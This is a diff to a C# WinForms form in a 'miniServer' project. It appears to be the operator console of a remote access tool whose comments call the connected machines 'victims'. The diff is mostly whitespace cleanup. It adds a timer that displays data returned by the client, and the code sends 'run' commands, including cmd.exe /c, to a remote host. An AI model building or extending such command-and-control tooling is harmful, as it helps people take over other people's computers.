@@ -6,7 +6,6 @@ using System.Drawing;
 using System.Linq;
 using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace miniServer
@@ -25,16 +24,16 @@ namespace miniServer
 
         private void InteractForm_Load(object sender, EventArgs e)
         {
-            mc.Interact    = true;
-            labelID.Text   = "HostName: " + mc.ID.ToString();   // ID
-            labelIP.Text   = "IP: " + mc.IP;  // Victim IP and Port
-            labelHost.Text = "HostName: " +  mc.HostName;   // Victim HostName
+            mc.Interact = true;
+            labelID.Text = "HostName: " + mc.ID.ToString();   // ID
+            labelIP.Text = "IP: " + mc.IP;  // Victim IP and Port
+            labelHost.Text = "HostName: " + mc.HostName;   // Victim HostName
             labelPort.Text = "Client port: " + mc.Port; // victim port
-  
+
         }
         private void SendCommand(string command)
         {
-            
+
             Thread thread = new Thread(() => sendToClientCommand(command));
             thread.IsBackground = true;
             thread.Start();
@@ -84,15 +83,31 @@ namespace miniServer
 
             string run = comboBoxRun.Text.ToLower();
             if (run == "cmd.exe" || run == "cmd")
-                SendCommand("run" + separator + comboBoxRun.Text +  separator + "/c " + comboBoxParameters.Text);
+                SendCommand("run" + separator + comboBoxRun.Text + separator + "/c " + comboBoxParameters.Text);
             else
                 SendCommand("run" + separator + comboBoxRun.Text + separator + comboBoxParameters.Text);
-                
+
         }
 
         private void InteractForm_FormClosed(object sender, FormClosedEventArgs e)
         {
             mc.Interact = false;
+        }
+
+        private void Timer1_Tick(object sender, EventArgs e)
+        {
+
+            if (mc.Recivedata != "")
+            {
+                richTextBox1.Invoke((MethodInvoker)delegate
+                {
+                    richTextBox1.Text += mc.Recivedata+"\n-----------------------------------------------------\n";
+                    mc.Recivedata = "";
+                    richTextBox1.SelectionStart = richTextBox1.Text.Length;
+                    richTextBox1.ScrollToCaret();
+                });
+            }
+
         }
     }
 }
